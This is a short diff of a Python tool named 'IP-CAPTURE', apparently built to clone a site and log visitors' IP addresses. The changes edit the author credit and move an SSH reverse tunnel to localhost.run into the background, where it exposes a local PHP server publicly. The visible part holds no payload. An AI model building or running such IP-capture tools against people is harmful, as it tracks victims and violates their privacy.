@@ -22,7 +22,7 @@ def clonar(url):
 def banner():
     banner_text = "IP-CAPTURE"
     print(banner_text)
-    print("By: FrankoSav By R3D-GHOST")
+    print("By R3D-GHOST")
     os.system("pkill php")  # Cambiado 'killall' por 'pkill' para mayor compatibilidad
     os.system("clear")
     print(banner_text)
@@ -90,7 +90,7 @@ def server():
 # Función para iniciar el túnel SSH y el servidor PHP
 def ssh():
     os.system("php -S localhost:8080 > /dev/null 2>&1 &")
-    os.system("ssh -R 80:localhost:8080 nokey@localhost.run")
+    os.system("ssh -R 80:localhost:8080 nokey@localhost.run > /dev/null 2>&1 &")
 
 # Ejecutar el banner y el menú principal
 if __name__ == "__main__":
